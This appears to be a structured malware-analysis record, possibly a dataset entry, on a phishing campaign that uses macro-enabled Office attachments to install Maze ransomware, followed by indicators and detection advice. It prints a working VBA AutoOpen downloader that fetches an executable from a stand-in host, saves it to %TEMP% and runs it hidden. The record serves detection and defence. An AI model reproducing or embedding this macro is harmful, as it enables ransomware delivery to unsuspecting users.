package_info.package_manager: N/A (delivered via email attachment, not a package manager)
package_info.why_malicious: The email campaign delivers weaponized Office documents containing malicious macros that, when enabled by the user, execute code to download and install the Maze ransomware. This results in unauthorized data encryption and extortion, posing a severe threat to data integrity and business operations.

execution_context.trigger: User enables macros after opening the malicious Office document.
execution_context.file_location: Embedded macro within the Office document attached to the phishing email (e.g., .docm, .xlsm in email attachment).

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: When the user enables macros after opening the document, the macro initiates an HTTP GET request to a remote server to download an executable, writes the binary to the user's TEMP directory, and executes it without user notification, resulting in the Maze ransomware payload being installed and run.

malice_analysis.why_suspicious: The macro automatically downloads and executes a binary from an external domain upon document open, a hallmark of malware delivery via Office documents.
malice_analysis.violated_expectations: Legitimate Office macros should not perform network operations to download executables or write and execute files in the user's TEMP directory without explicit user consent.
malice_analysis.similar_legitimate_use: In rare, highly controlled enterprise environments, macros may automate document processing or interact with internal resources, but they should never download and execute code from untrusted external sources.
key_indicators: AutoOpen macro triggers code execution immediately upon document open
Use of MSXML2.XMLHTTP object for outbound HTTP requests
Creation and use of ADODB.Stream to write binary data to disk
Saving an executable file to %TEMP% directory
Execution of downloaded binary via Shell with no user notification
No visible indication or consent requested from the user

attack_chain.action: User receives a phishing email containing a weaponized Office document as an attachment.
User is prompted to enable macros to view the document's content.
attack_chain.leads_to: Macro code is enabled and ready to execute.

attack_chain.action: Malicious macro executes, downloading and running the Maze ransomware payload from a remote server.
attack_chain.leads_to: Ransomware encrypts user files and displays a ransom note demanding payment.

behavioral_signatures: Office document macros that initiate outbound HTTP requests using MSXML2.XMLHTTP
Macros that create and write executable files (e.g., .exe) to the %TEMP% directory
Macros that invoke Shell or similar functions to execute newly written binaries from disk
Office processes (e.g., WINWORD.EXE, EXCEL.EXE) spawning child processes for unknown executables
file_indicators: Office documents with embedded macros (e.g., .docm, .xlsm) received via email
Executable files named payload.exe or similar written to %TEMP% directory
Presence of ransom note files in user directories after document execution
network_indicators: Outbound HTTP GET requests from Office processes to suspicious or known malicious domains (e.g., http://malicious-domain.com/payload.exe)
Download of executable payloads via MSXML2.XMLHTTP from Office applications
detection_knowledge.how_to_detect: Monitor for Office documents with macros that perform network activity, especially those that download and write executable files to disk. Flag any Office process (such as WINWORD.EXE or EXCEL.EXE) that writes .exe files to the %TEMP% directory or spawns new processes. Use sandbox analysis to detonate suspicious attachments and observe for behaviors such as mass file encryption and ransom note creation. Correlate network logs for Office processes making outbound HTTP requests to untrusted domains.
